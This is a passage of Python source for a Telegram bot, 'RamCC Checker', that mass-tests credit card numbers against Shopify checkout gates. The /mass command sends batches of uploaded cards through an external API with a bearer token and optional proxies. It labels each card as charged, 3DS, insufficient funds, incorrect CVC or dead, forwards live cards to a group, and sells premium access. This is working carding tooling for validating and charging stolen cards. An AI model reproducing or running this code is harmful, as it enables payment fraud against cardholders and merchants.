                    logger.info(f"Response status: {resp.status}, Content-Type: {resp.headers.get('Content-Type', 'unknown')}")
                    
                    text = await resp.text()
                    
                    # Check if response is HTML instead of JSON
                    if text.strip().startswith(('<!DOCTYPE', '<html')):
                        logger.error(f"Invalid API response (HTML received) in /agql for site {site}: {text[:100]}")
                        await processing_msg.edit_text(
                            f"❌ Invalid response from API. The site '{site}' might not be a valid Shopify site or might be protected.\n\n"
                            f"Try a different site or contact the bot owner."
                        )
                        return
                    
                    try:
                        response_data = json.loads(text)
                        if "TypeX" in response_data:
                            gate_type = "Shopify + " + response_data["TypeX"]
                        else:
                            gate_type = "Shopify Normal"
                            
                        if "Amount" in response_data:
                            amount = response_data["Amount"]
                        else:
                            amount = "Unknown"
                    except json.JSONDecodeError:
                        logger.error(f"Invalid API response (not JSON) in /agql for site {site}: {text[:100]}")
                        await processing_msg.edit_text(
                            f"❌ Cannot parse API response. The site '{site}' might not be a valid Shopify site.\n\n"
                            f"Try a different site or contact the bot owner if this issue persists."
                        )
                        return
            except aiohttp.ClientProxyConnectionError as proxy_error:
                logger.error(f"Proxy connection error in /agql for site {site}: {str(proxy_error)}")
                await processing_msg.edit_text(
                    f"❌ Proxy connection error. Your proxy may be invalid or expired.\n\n"
                    f"Please set a new proxy with /set_proxy and try again."
                )
                return
            except aiohttp.ClientConnectorError as conn_error:
                logger.error(f"Connection error in /agql for site {site}: {str(conn_error)}")
                await processing_msg.edit_text(
                    f"❌ Connection error. Could not connect to the API or site.\n\n"
                    f"Error: {str(conn_error)[:100]}"
                )
                return
            except asyncio.TimeoutError:
                logger.error(f"Timeout in /agql for site {site}")
                await processing_msg.edit_text(
                    f"❌ Request timed out. The site or API might be slow or unreachable."
                )
                return
    except Exception as e:
        logger.error(f"Error fetching gate info in /agql for site {site}: {str(e)}")
        await processing_msg.edit_text(
            f"❌ An error occurred: {str(e)[:100]}\n\n"
            f"Try again or contact the bot owner if the issue persists."
        )
        return
        
    # Format response in specified UI
    formatted_response = f"""{RAM_ICON} RamCC Checker| Site Added ✅
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
{DEV_LINK} 𝐒𝐢𝐭𝐞: https://{site}
{DEV_LINK} 𝐎𝐫𝐝𝐞𝐫'𝐬 𝐏𝐫𝐢𝐜𝐞: {amount}$
{DEV_LINK} 𝐆𝐚𝐭𝐞: {gate_type}
{DEV_LINK} 𝐔𝐬𝐞: /mass or /chk
{DEV_LINK} 𝐏𝐫𝐨𝐱𝐲: {proxy_status}{proxy_ip_info}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
{DEV_LINK} 𝐑𝐞𝐪 𝐁𝐲: {BotUtils.get_user_identifier(update.effective_user)}
{DEV_LINK} 𝐃𝐞𝐯: {owner_name}"""
    
    # Update the processing message
    await processing_msg.edit_text(formatted_response, parse_mode=constants.ParseMode.HTML, disable_web_page_preview=True)

# /mass (reply to file) → Send batch requests
async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Check authorization with premium requirement
    authorized, reason = await check_authorization(update, context, True, "mass")
    if not authorized:
        # Display appropriate message based on reason
        if reason == "not_premium":
            await update.message.reply_text(
                f"⭐️ The /mass command requires premium status.\n"
                f"Contact @TheRam_Bhakt to purchase premium access."
            )
        return
    
    # Comment out proxy requirement
    """
    # Check if proxy is set (now mandatory)
    if user_id not in user_proxies:
        await update.message.reply_text(
            f"❌ You must set a proxy first using /set_proxy before using this command.\n\n"
            f"Example: /set_proxy 1.2.3.4:8080 or /set_proxy 1.2.3.4:8080:username:password"
        )
        return
    """
    
    # Check if already running a mass command
    if user_id in active_mass_commands and active_mass_commands[user_id]:
        await update.message.reply_text("❌ You already have an active /mass command running. Use /stop first.")
        return
    
    if not update.message.reply_to_message:
        await update.message.reply_text("❌ You must reply to the file message with /mass")
        return

    site = user_sites.get(user_id)
    cc_list = context.user_data.get("cc_list")

    if not site:
        await update.message.reply_text("❌ Set a default site first using /agql <site>")
        return
    if not cc_list:
        await update.message.reply_text("❌ No CCs found. Upload a file first.")
        return
    
    # Check CC count limit
    if len(cc_list) > 50:
        await update.message.reply_text("⚠️ Maximum 50 CCs allowed. Please reduce the number of CCs.")
        return
    
    # Set as active mass command
    active_mass_commands[user_id] = True
    # Set active command flag
    user_active_cmd[user_id] = True
    
    # Reset stats update event
    stats_updated.clear()

    # Get 3DS notification setting (default: ON)
    show_3ds = show_3ds_notifications.get(user_id, True)
    
    # Check if user has a proxy set
    proxy_str = None
    proxy_status = "❌ Disabled"
    proxy_ip_info = ""
    
    if user_id in user_proxies:
        if isinstance(user_proxies[user_id], dict):
            # New format with IP information
            proxy_str = user_proxies[user_id]['full']
            proxy_status = "✅ Enabled"
            proxy_ip_info = f"{DEV_LINK} 🌐 Proxy IP: <code>{user_proxies[user_id]['ip']}</code>\n"
        else:
            # Old format compatibility
            proxy_str = user_proxies[user_id]
            proxy_status = "✅ Enabled"
    
    # Initialize counters with thread safety
    total_cc = len(cc_list)
    live_cc = 0
    threeds_cc = 0
    dead_cc = 0
    error_cc = 0
    insuff_funds_cc = 0  # New counter for insufficient funds
    incorrect_cvc_cc = 0  # Counter for incorrect CVC
    
    # Get owner name for notifications (fetch once before threading)
    owner_name = await get_owner_name_link(context)
    
    # Initial stats message
    stats_msg = await update.message.reply_text(
        f"🌀 Processing {total_cc} CCs...\n\n"
        f"📊 Stats:\n"
        f"Total: {total_cc}\n"
        f"Charged 🔥 : {live_cc}\n"
        f"3DS: {threeds_cc}\n"
        f"Insufficient Funds 💸: {insuff_funds_cc}\n"
        f"Incorrect CVC 🔑: {incorrect_cvc_cc}\n"
        f"Dead: {dead_cc}\n"
        f"Error: {error_cc}\n\n"
        f"🌐 Proxy: {proxy_status}\n"
        f"ℹ️ Use /stop to cancel this operation"
    )

    results = []
    processed_count = 0
    
    # Function to check a single CC in a thread
    def check_single_cc(cc, index):
        nonlocal live_cc, threeds_cc, dead_cc, error_cc, processed_count, insuff_funds_cc, incorrect_cvc_cc
        
        # Check if command was stopped
        if not active_mass_commands.get(user_id, False):
            return None
        
        # Normalize CC format for API
        normalized_cc = normalize_cc_format(cc)
            
        url = f"{API_URL}?link={site}&bearer={BEARER}&cc={normalized_cc}"
        try:
            # Set up proxy if available
            proxy_dict = None
            if user_id in user_proxies:
                proxy_str = user_proxies[user_id]['full'] if isinstance(user_proxies[user_id], dict) else user_proxies[user_id]
                
                # Parse the proxy string into components
                if '@' in proxy_str:  # Webshare format
                    proxy_dict = {
                        'http': f'http://{proxy_str}',
                        'https': f'https://{proxy_str}'
                    }
                else:
                    proxy_parts = proxy_str.split(':')
                    
                    if len(proxy_parts) == 2:  # ip:port
                        proxy_dict = {
                            'http': f'http://{proxy_parts[0]}:{proxy_parts[1]}',
                            'https': f'https://{proxy_parts[0]}:{proxy_parts[1]}'
                        }
                    elif len(proxy_parts) >= 4:  # ip:port:user:pass
                        proxy_auth = f'{proxy_parts[2]}:{proxy_parts[3]}'
                        proxy_url = f'{proxy_parts[0]}:{proxy_parts[1]}'
                        proxy_dict = {
                            'http': f'http://{proxy_auth}@{proxy_url}',
                            'https': f'https://{proxy_auth}@{proxy_url}'
                        }
            
            # Use requests synchronously in thread with proxy if set
            import requests
            logger.info(f"Making API request to {url} with proxy: {proxy_dict}")
            response = requests.get(url, proxies=proxy_dict, timeout=30, verify=True)
            text = response.text

            try:
                # Parse API response
                response_data = json.loads(text)
                
                # Extract key information
                status = response_data.get('Status', 'Unknown')
                response_code = response_data.get('Response', 'Unknown')
                gateway = "Shopify" +response_data.get('TypeX', 'Unknown')
                
                # Improved 3DS detection - check this before charged detection
                if any(phrase in status.lower() for phrase in ["3ds", "3d secure", "verification", "verified", "authentication"]) or \
                   any(phrase in response_code.lower() for phrase in ["3ds", "3d secure", "verification", "verified", "authentication", "authorize", "authorize.net"]):
                    status_emoji = "🔒"
                    result_type = "3DS"
                    is_live = False
                # Check for incorrect CVC
                elif "incorrect_cvc" in response_code.lower() or "incorrect cvc" in response_code.lower() or \
                     "incorrect_cvc" in status.lower() or "incorrect cvc" in status.lower() or \
                     "security code is incorrect" in response_code.lower() or "security code is incorrect" in status.lower():
                    status_emoji = "🔑"
                    result_type = "INCORRECT CVC"
                    is_live = True  # Consider as live since the card is valid
                # Check for insufficient funds
                elif "insufficient_funds" in response_code.lower() or "insufficient funds" in response_code.lower() or "insufficient_funds" in status.lower() or "insufficient funds" in status.lower():
                    status_emoji = "💸"
                    result_type = "INSUFFICIENT FUNDS"
                    is_live = False
                # Only check for charged/success if not already identified as 3DS
                elif "approved" in status.lower() or "success" in status.lower() or "charged" in status.lower() or \
                     "order placed" in response_code.lower() or "placed" in response_code.lower() or "order_confirm" in response_code.lower():
                    status_emoji = "🔥"
                    result_type = "CHARGED"
                    is_live = True
                elif "declined" in status.lower() or "declined" in response_code.lower():
                    status_emoji = "❌"
                    result_type = "DECLINED"
                    is_live = False
                else:
                    status_emoji = "⚠️"
                    result_type = "ERROR"
                    is_live = False
                
                # Prepare formatted result
                result_message = f"""{RAM_ICON} CC Check Result ({index+1}/{len(cc_list)})
━━━━━━━━━━━━━
{DEV_LINK} 𝐂𝐚𝐫𝐝: <code>{cc}</code>
{DEV_LINK} 𝐎𝐫𝐝𝐞𝐫'𝐬 𝐏𝐫𝐢𝐜𝐞: {response_data.get('Amount', 'Unknown')}$
{DEV_LINK} 𝐓𝐲𝐩𝐞: {gateway}
{DEV_LINK} 𝐒𝐭𝐚𝐭𝐮𝐬: {result_type == "CHARGED" and "Charged!" or result_type == "3DS" and "Approved" or result_type == "INSUFFICIENT FUNDS" and "Approved" or result_type == "INCORRECT CVC" and "Approved" or status} {status_emoji}
{DEV_LINK} 𝐑𝐞𝐬𝐮𝐥𝐭: {result_type == "3DS" and "OTP REQUIRED" or result_type == "INSUFFICIENT FUNDS" and "INSUFFICIENT FUNDS" or result_type == "INCORRECT CVC" and "INCORRECT CVC" or response_code}
{DEV_LINK} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: #GraphQL | {result_type}
{DEV_LINK} 𝐏𝐫𝐨𝐱𝐲: {proxy_status}
{proxy_ip_info}━━━━━━━━━━━━━
{DEV_LINK} 𝐑𝐞𝐪 𝐁𝐲: {BotUtils.get_user_identifier(update.effective_user)}"""
                
                return {
                    "index": index,
                    "error": False,
                    "message": result_message,
                    "is_live": is_live,
                    "cc": cc,
                    "response_data": response_data,
                    "status": status,
                    "response_code": response_code,
                    "gateway": gateway
                }
                
            except json.JSONDecodeError:
                return {
                    "index": index,
                    "error": True,
                    "message": f"❌ CC {index+1}/{len(cc_list)}: Invalid API response format"
                }
                
        except Exception as e:
            return {
                "index": index,
                "error": True,
                "message": f"❌ CC {index+1}/{len(cc_list)}: Error: {str(e)[:100]}"
            }
    
    # Use ThreadPoolExecutor to check CCs in parallel
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=min(max_workers, len(cc_list))) as executor:
        # Submit all tasks
        future_to_cc = {
            executor.submit(check_single_cc, cc, i): (cc, i) 
            for i, cc in enumerate(cc_list)
        }
        
        # Process results as they complete
        for future in concurrent.futures.as_completed(future_to_cc):
            result = future.result()
            results.append(result)
            
            # If this is a live or approved card, forward it to the group immediately
            if not result["error"] and (result.get("is_live", False) or 
                                      "3DS" in result.get("status", "") or 
                                      "INCORRECT CVC" in result.get("result_type", "") or
                                      "INSUFFICIENT FUNDS" in result.get("result_type", "")):
                # Send notification to group
                try:
                    cc = result["cc"]
                    response_data = result["response_data"]
                    gateway = result["gateway"]
                    status = result["status"]
                    response_code = result["response_code"]
                    result_type = result.get("result_type", "CHARGED" if result.get("is_live") else "APPROVED")
                    
                    # Get proxy IP detail for notification
                    proxy_ip_detail = ""
                    if user_id in user_proxies and isinstance(user_proxies[user_id], dict):
                        proxy_ip_detail = f' | IP: {user_proxies[user_id]["ip"]}'
                    
                    # Get owner name
                    owner_name = await get_owner_name_link(context)
                    
                    # Determine emoji and display result based on result type
                    status_emoji = "🔥"
                    display_status = "Charged!"
                    display_result = response_code
                    
                    if "3DS" in result_type:
                        status_emoji = "🔒"
                        display_status = "Approved"
                        display_result = "OTP REQUIRED"
                    elif "INCORRECT CVC" in result_type:
                        status_emoji = "🔑"
                        display_status = "Approved"
                        display_result = "INCORRECT CVC"
                    elif "INSUFFICIENT FUNDS" in result_type:
                        status_emoji = "💸"
                        display_status = "Approved" 
                        display_result = "INSUFFICIENT FUNDS"
                    
                    group_notification = f"""#LiveCard #AutoShopify | Ram X Checker
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
💳 𝐂𝐂: <code>{cc}</code>
💵 𝐀𝐦𝐨𝐮𝐧𝐭: {response_data.get('Amount', 'Unknown')}$
🧩 𝐆𝐚𝐭𝐞: {gateway}
✨ 𝐒𝐭𝐚𝐭𝐮𝐬: {display_status} {status_emoji}
📝 𝐑𝐞𝐬𝐮𝐥𝐭: {display_result}
🌐 𝐏𝐫𝐨𝐱𝐲: {proxy_status}{'' if not proxy_ip_info else f' | IP: {user_proxies[user_id]["ip"]}' if isinstance(user_proxies.get(user_id), dict) else ''}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
👤 𝐔𝐬𝐞𝐫: {BotUtils.get_user_identifier(update.effective_user)}
⚡ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲: {owner_name}"""
                    
                    # This needs to be wrapped in asyncio.create_task for async execution
                    context.application.create_task(
                        context.bot.send_message(
                            chat_id=LIVE_CARDS_GROUP,
                            text=group_notification,
                            parse_mode=constants.ParseMode.HTML,
                            disable_web_page_preview=True
                        )
                    )
                except Exception as e:
                    logger.error(f"Failed to forward CC to group: {str(e)}")
    
    # Sort results by original index
    results.sort(key=lambda x: x["index"])
    
    # Update status message
    await status_msg.edit_text(f"✅ Completed checking {len(cc_list)} CCs against {site}")
    
    # Clear active command flag
    user_active_cmd[user_id] = False
    
    # Send all results
    for result in results:
        await BotUtils.send_response(update, result["message"])

# /alist → List all approved users (owner only)
@admin_command
async def approved_list_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Debug log the current approved_users dictionary
    logger.info(f"Current approved_users dictionary: {approved_users}")
    
    # If no users are approved
    if not approved_users:
        await update.message.reply_text("No users have been approved yet.")
        return
    
    # Get user info for each approved user
    user_info_list = []
    
    for idx, (u_id, user_data) in enumerate(approved_users.items(), 1):
        try:
            # Try to get user information
            chat = await context.bot.get_chat(u_id)
            first_name = chat.first_name or "Unknown"
            username = f"@{chat.username}" if chat.username else f"ID: {u_id}"
            
            # Format expiry info
            expiry_info = ""
            if 'expiry' in user_data and user_data['expiry']:
                # Calculate remaining time
                now = int(time.time())
                if user_data['expiry'] > now:
                    from datetime import datetime
                    expiry_date = datetime.fromtimestamp(user_data['expiry']).strftime("%d-%m-%Y %H:%M")
                    remaining_days = int((user_data['expiry'] - now) / (24 * 60 * 60))
                    expiry_info = f" | Expires: {expiry_date} ({remaining_days} days left)"
                else:
                    # This should not happen as expired users should be removed, but just in case
                    expiry_info = " | Expired"
            else:
                expiry_info = " | Lifetime"
            
            user_info_list.append(f"{idx}. {first_name} (<code>{u_id}</code> | {username}){expiry_info}")
        except Exception as e:
            # If can't get user info, just show the ID
            logger.error(f"Error getting info for user {u_id}: {str(e)}")
            expiry_info = ""
            if 'expiry' in user_data and user_data['expiry']:
                from datetime import datetime
                expiry_date = datetime.fromtimestamp(user_data['expiry']).strftime("%d-%m-%Y")
                expiry_info = f" | Expires: {expiry_date}"
            else:
                expiry_info = " | Lifetime"
                
            user_info_list.append(f"{idx}. Unknown User (<code>{u_id}</code>){expiry_info}")
    
    # Format the list
    response = f"""
{RAM_ICON} RamCC Checker | Approved Users
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} Total Approved: {len(approved_users)}
{DEV_LINK} Click on any ID to copy
━━━━━━━━━━━━━━━━━━━━
{chr(10).join(user_info_list)}
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} 𝐑𝐞𝐪 𝐁𝐲: {BotUtils.get_user_identifier(update.effective_user)}
"""
    await update.message.reply_text(response, parse_mode=constants.ParseMode.HTML, disable_web_page_preview=True)

# /check → Check if user is a member of required channel and group
async def check_membership_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Check membership
    is_member, membership_info = await check_user_membership(update, context)
    
    if is_member:
        # User is a member of both channel and group
        # For group membership specifically, mark as confirmed
        confirmed_group_members.add(user_id)
        logger.info(f"User {user_id} confirmed group membership via /check command")
        
        await update.message.reply_text(
            f"""✅ <b>Membership Verified</b>

You are a member of our required channels:
• Official Channel ✓
• Discussion Group ✓

You have full access to all bot features.
""",
            parse_mode=constants.ParseMode.HTML
        )
    else:
        # User is not a member of both channel and group
        not_joined_message, join_buttons = membership_info
        # Enhance the message for the check command
        not_joined_message += "\nClick the button(s) below to join, then use /check again to verify."
        
        await update.message.reply_text(
            not_joined_message,
            parse_mode=constants.ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([join_buttons]) if join_buttons else None
        )

# 🌸 /start — Ram X Welcome UI
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Track user for broadcast purposes
    bot_users.add(user_id)
    
    is_authorized = user_id == OWNER_ID or user_id in approved_users
    
    # Check membership of required channels first
    is_member, membership_info = await check_user_membership(update, context)
    
    # Create help button
    buttons = [InlineKeyboardButton("📚 View Commands", callback_data="help_back")]
    
    # Add channel/group join buttons if needed
    if not is_member and user_id != OWNER_ID:
        not_joined_message, join_buttons = membership_info
        buttons = join_buttons + [InlineKeyboardButton("🔄 Verify Membership", callback_data="verify_membership")]
    
    # Base welcome message
    welcome_message = f"""{RAM_ICON} <b>RamCC Checker</b> | <i>Auto Shopify Gate</i>

{DEV_LINK} <b>Welcome,</b> {update.effective_user.first_name or "User"}! Use this bot to check CCs against Shopify gates.
{DEV_LINK} <b>Status:</b> {"✅ Authorized" if is_authorized else "❌ Not Authorized"}
{DEV_LINK} <b>Your ID:</b> <code>{update.effective_user.id}</code>"""

    # Add guidance based on authorization and membership status
    if is_authorized:
        if not is_member and user_id != OWNER_ID:
            welcome_message += f"""

<b>⚠️ Channel Membership Required ⚠️</b>
Please join our official channel and discussion group to use the bot.
Use the buttons below to join, then click "Verify Membership".

<i>Use /help to see available commands</i>
{DEV_LINK} <b>Creator:</b> <a href='https://t.me/TheRam_Bhakt'>@TheRam_Bhakt</a>"""
        else:
            welcome_message += f"""

<i>Use /help to see available commands</i>
{DEV_LINK} <b>Creator:</b> <a href='https://t.me/TheRam_Bhakt'>@TheRam_Bhakt</a>"""
    else:
        # Add instructions for unauthorized users
        welcome_message += f"""

<b>⚠️ You are not authorized to use this bot ⚠️</b>
To gain access, please contact the bot owner with your User ID shown above.

{DEV_LINK} <b>Creator:</b> <a href='https://t.me/TheRam_Bhakt'>@TheRam_Bhakt</a>"""
    
    # Create button rows based on number of buttons
    keyboard = []
    if len(buttons) <= 2:
        keyboard = [buttons]
    else:
        # Put first two buttons in first row, remaining in second row
        keyboard = [buttons[:2], buttons[2:]]
    
    await BotUtils.send_response(
        update,
        welcome_message,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# /bcast message → Broadcast a message to all users (owner only)
@admin_command
async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Check if there's a message to broadcast
    if not context.args:
        await update.message.reply_text("Usage: /bcast <message>\n\nThis will send your message to all users who have started the bot.")
        return
    
    # Get broadcast message
    broadcast_message = " ".join(context.args)
    
    # Add a signature to the broadcast message
    formatted_message = f"""{RAM_ICON} <b>📢 Official Broadcast</b>

{broadcast_message}

{DEV_LINK} <i>- {"Admin" if update.effective_user.id != OWNER_ID else "Owner"}</i>"""
    
    # Send confirmation message to the owner
    confirm_msg = await update.message.reply_text(
        f"🔄 Starting broadcast to {len(bot_users)} users...\n\n"
        f"Preview:\n{formatted_message}",
        parse_mode=constants.ParseMode.HTML
    )
    
    # Initialize counters
    success_count = 0
    fail_count = 0
    
    # Send broadcast to all users with progress updates
    total_users = len(bot_users)
    update_interval = max(1, min(50, total_users // 10))  # Update every 10% or at reasonable intervals
    
    for i, user_id in enumerate(list(bot_users), 1):
        try:
            # Actually send the message
            await context.bot.send_message(
                chat_id=user_id,
                text=formatted_message,
                parse_mode=constants.ParseMode.HTML,
                disable_web_page_preview=True
            )
            success_count += 1
        except Exception as e:
            # Log error and increment fail counter
            logger.error(f"Failed to send broadcast to {user_id}: {e}")
            fail_count += 1
        
        # Update progress every X users
        if i % update_interval == 0 or i == total_users:
            progress_percent = (i / total_users) * 100
            await confirm_msg.edit_text(
                f"🔄 Broadcasting: {i}/{total_users} users ({progress_percent:.1f}%)\n\n"
                f"✅ Success: {success_count}\n"
                f"❌ Failed: {fail_count}"
            )
    
    # Send final summary
    completion_time = time.strftime("%H:%M:%S")
    await confirm_msg.edit_text(
        f"""📊 <b>Broadcast Complete</b> at {completion_time}
        
📨 Total recipients: {total_users}
✅ Successfully sent: {success_count}
❌ Failed: {fail_count}
📝 Message: <i>{broadcast_message[:50]}{'...' if len(broadcast_message) > 50 else ''}</i>

📈 Success rate: {(success_count/total_users*100):.1f}%
""",
        parse_mode=constants.ParseMode.HTML
    )

# /set_proxy proxy_string → Set default proxy for API calls
async def set_proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set proxy command implementation - currently disabled"""
    # Simple message instead of proxy functionality
    await update.message.reply_text(
        f"{RAM_ICON} Proxy settings currently disabled by admin.\n"
        f"This feature will be re-enabled in a future update."
    )
    return

# Placeholder function just to search for the threeds_notification section
async def placeholder_function():
    """This is just to search for the threeds_notification section in the file.
    Will be used to identify the exact location to update."""
    pass

# /mc /command → Toggle command availability (owner only)
@admin_command
async def manage_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Check arguments
    if not context.args or not context.args[0].startswith('/'):
        await update.message.reply_text(
            "Usage: /mc /command\n"
            "Example: /mc /gql (to toggle the /gql command)\n\n"
            "This will enable or disable the specified command."
        )
        return
    
    # Get the command to toggle (remove leading slash)
    cmd = context.args[0][1:].lower()
    
    # Check if it's a valid command
    valid_commands = [
        'gql', 'agql', 'mass', 'chk', 'txt', 'flt', 'scr', 'open',
        '3d', 'stop', 'check', 'ping', 'set_proxy', 'grpstatus'
    ]
    
    # Don't allow disabling critical commands
    protected_commands = ['start', 'help', 'mc', 'approve', 'a', 'rem', 'apg', 'premium',
                          'proxylist', 'alist', 'glist', 'b', 'bcast', 'listmc']
    
    if cmd in protected_commands:
        await update.message.reply_text(
            f"⚠️ Error: Cannot toggle protected command /{cmd}\n"
            f"Protected commands include owner commands and essential bot functions."
        )
        return
    
    if cmd not in valid_commands:
        valid_cmds_list = '\n'.join([f"• /{c}" for c in valid_commands])
        await update.message.reply_text(
            f"⚠️ Error: Unknown or invalid command /{cmd}\n"
            f"Valid toggleable commands:\n{valid_cmds_list}"
        )
        return
    
    # Toggle command status
    if cmd in disabled_commands:
        # Enable the command
        del disabled_commands[cmd]
        status = "enabled ✅"
    else:
        # Disable the command
        disabled_commands[cmd] = {
            'disabled_by': update.effective_user.id,
            'disabled_on': int(time.time())
        }
        status = "disabled ❌"
    
    # Send confirmation
    await update.message.reply_text(
        f"""{RAM_ICON} Command Management
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} Command: /{cmd}
{DEV_LINK} Status: {status}
{DEV_LINK} Current disabled commands: {len(disabled_commands)}
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} Action by: {BotUtils.get_user_identifier(update.effective_user)}""",
        parse_mode=constants.ParseMode.HTML
    )

# /listmc → List all disabled commands (owner only)
@admin_command
async def list_disabled_commands(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all disabled commands"""
    if not disabled_commands:
        await update.message.reply_text("No commands are currently disabled.")
        return
    
    disabled_list = []
    for cmd, info in disabled_commands.items():
        disabled_time = datetime.fromtimestamp(info["disabled_on"]).strftime("%d-%m-%Y %H:%M")
        disabled_list.append(f"• /{cmd} - Disabled on {disabled_time}")
    
    await update.message.reply_text(
        f"""{RAM_ICON} Disabled Commands List
━━━━━━━━━━━━━━━━━━━━
{chr(10).join(disabled_list)}
━━━━━━━━━━━━━━━━━━━━
Total: {len(disabled_commands)} disabled command(s)
"""
    )

# /open → Open and read a text file (reply to file)
async def open_file_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Add debug logging
    logger.info(f"Open file command called by user {user_id}")
    
    # Check authorization (no premium needed)
    try:
        authorized, reason = await check_authorization(update, context, False, "open")
        if not authorized:
            await update.message.reply_text(f"❌ {reason}")
            return
    except Exception as e:
        logger.error(f"Error in open_file_command authorization: {str(e)}")
        await update.message.reply_text(f"❌ Authorization error: {str(e)[:100]}")
        return
    
    # Check if replying to a file
    reply = update.message.reply_to_message
    if not reply or not reply.document:
        await update.message.reply_text("❌ Please use this command by replying to a file.")
        return
    
    # Check if file has a valid extension
    document = reply.document
    file_name = document.file_name
    
    # Only allow text files and similar formats
    allowed_extensions = ['.txt', '.log', '.csv', '.json', '.js', '.py', '.html', '.css', '.md', '.xml']
    
    # Check file extension
    is_allowed = False
    for ext in allowed_extensions:
        if file_name.lower().endswith(ext):
            is_allowed = True
            break
    
    if not is_allowed:
        await update.message.reply_text(
            f"❌ Only text-based files are supported.\n"
            f"Allowed extensions: {', '.join(allowed_extensions)}"
        )
        return
    
    # Check file size (limit to 1MB)
    if document.file_size > 1024 * 1024:
        await update.message.reply_text(
            f"❌ File is too large ({document.file_size // 1024} KB).\n"
            f"Maximum file size: 1024 KB (1 MB)"
        )
        return
    
    # Send processing message
    progress_msg = await update.message.reply_text(f"📄 Opening file {file_name}...")
    
    try:
        # Download the file
        file = await document.get_file()
        content = await file.download_as_bytearray()
        
        # Decode the content
        try:
            text_content = content.decode('utf-8')
        except UnicodeDecodeError:
            # Try another common encoding if UTF-8 fails
            try:
                text_content = content.decode('latin-1')
            except UnicodeDecodeError:
                await progress_msg.edit_text(f"❌ Unable to decode file. The file might not be a text file.")
                return
        
        # Count lines and characters
        line_count = text_content.count('\n') + 1
        char_count = len(text_content)
        
        # Check if content is too large to send directly
        if char_count > 4000:
            # Split into multiple messages if too large
            chunks = []
            max_chunk_size = 4000
            current_chunk = ""
            
            for line in text_content.split('\n'):
                # If adding this line would make the chunk too large, start a new chunk
                if len(current_chunk) + len(line) + 1 > max_chunk_size:
                    chunks.append(current_chunk)
                    current_chunk = line + '\n'
                else:
                    current_chunk += line + '\n'
            
            # Add the last chunk if it has content
            if current_chunk:
                chunks.append(current_chunk)
            
            # Update progress message
            await progress_msg.edit_text(
                f"📄 File: {file_name}\n"
                f"📊 Size: {document.file_size // 1024} KB\n"
                f"📝 Lines: {line_count}\n"
                f"🔤 Characters: {char_count}\n\n"
                f"Content is large, sending in {len(chunks)} parts..."
            )
            
            # Send each chunk
            for i, chunk in enumerate(chunks, 1):
                # Use safe handling for HTML
                safe_chunk = html.escape(chunk)
                await update.message.reply_text(
                    f"<b>📄 {file_name} - Part {i}/{len(chunks)}</b>\n"
                    f"<pre>{safe_chunk}</pre>",
                    parse_mode=constants.ParseMode.HTML
                )
                
                # Small delay to avoid flooding
                await asyncio.sleep(0.5)
        else:
            # Content is small enough to send in one message
            # Use safe handling for HTML
            safe_content = html.escape(text_content)
            await progress_msg.edit_text(
                f"<b>📄 File: {file_name}</b>\n"
                f"📊 Size: {document.file_size // 1024} KB\n"
                f"📝 Lines: {line_count}\n"
                f"🔤 Characters: {char_count}\n\n"
                f"<pre>{safe_content}</pre>",
                parse_mode=constants.ParseMode.HTML
            )
    
    except Exception as e:
        # Handle any errors
        logger.error(f"Error in open_file_command: {str(e)}")
        await progress_msg.edit_text(f"❌ Error reading file: {str(e)[:100]}")
        return

# Button callback handler for interactive buttons
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    chat_type = update.effective_chat.type
    chat_id = update.effective_chat.id
    
    # Always acknowledge the button press
    await query.answer()
    
    # Get owner name for all responses
    owner_name = await get_owner_name_link(context)
    
    # Log the button press for debugging
    logger.info(f"Button callback: {query.data} pressed by user {user_id} in {chat_type} chat {chat_id}")
    
    if query.data == "verify_membership":
        # Check membership status
        is_member, membership_info = await check_user_membership(update, context)
        
        if is_member:
            # User is now a member of both channel and group
            # For group membership specifically, mark as confirmed
            confirmed_group_members.add(user_id)
            logger.info(f"User {user_id} confirmed group membership via verification button")
            
            await query.edit_message_text(
                f"""✅ <b>Membership Verified</b>

You are now a member of our required channels:
• Official Channel ✓ 
• Discussion Group ✓

You have full access to all bot features. Use /help to see available commands.
""",
                parse_mode=constants.ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("📚 View Commands", callback_data="help_back")
                ]])
            )
        else:
            # User is still not a member of all required channels
            not_joined_message, join_buttons = membership_info
            # Update message to show current status
            not_joined_message = f"""⚠️ <b>Membership Check Failed</b>

You still need to join our:
{'' if is_member else '• Official Channel and/or Discussion Group'}

Please click the button(s) below to join, then verify again.
"""
            await query.edit_message_text(
                not_joined_message,
                parse_mode=constants.ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([
                    join_buttons,
                    [InlineKeyboardButton("🔄 Verify Again", callback_data="verify_membership")]
                ])
            )
    
    elif query.data == "help_set_site":
        # Provide instructions on how to set a default site
        await query.edit_message_text(
            f"""{RAM_ICON} RamCC Checker | Setting Default Site
━━━━━━━━━━━━━━━━━━━━
{DEV_LINK} <b>How to Set Default Site:</b>

1️⃣ Start a private chat with @RamCC_checker

2️⃣ Use the command /agql followed by your site:
   Example: <code>/agql example.com</code>
